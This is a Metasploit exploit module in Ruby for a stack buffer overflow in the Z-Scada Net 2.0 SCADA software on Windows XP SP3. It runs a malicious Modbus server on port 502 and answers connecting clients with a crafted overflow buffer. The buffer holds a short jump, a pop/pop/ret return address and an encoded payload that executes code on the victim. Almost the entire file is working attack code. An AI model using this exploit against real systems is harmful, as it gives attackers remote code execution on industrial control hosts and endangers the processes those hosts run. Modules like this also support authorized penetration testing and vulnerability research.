require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ZScada Net Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack based buffer overflow found in
				Z-Scada Net 2.0.  The vulnerability is triggered when parsing
				the response to a Modbus packet.
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'url', 'https://lists.immunityinc.com/pipermail/canvas/2014-December/000141.html' ],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "",
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3 EN', 
							{
								# zscadanet.exe v1.0
								# pop ecx/ pop ebp/ retn
								'Ret' => 0x00429c35
							} 
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Dec 11 2014'))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The port to listen on", 502])
			], self.class)
	end

	def on_client_data(client)
		p = payload.encoded

		buf = pattern_create(5000)
		buf[574, 4] = [0x909006eb].pack('V')	# jmp $+8
		buf[578, 4] = [target.ret].pack('V')
		buf[582, 24] = "\x41" * 24
		buf[606, p.length] = p

		client.put(buf)
		handler
		service.close_client(client)
	end

end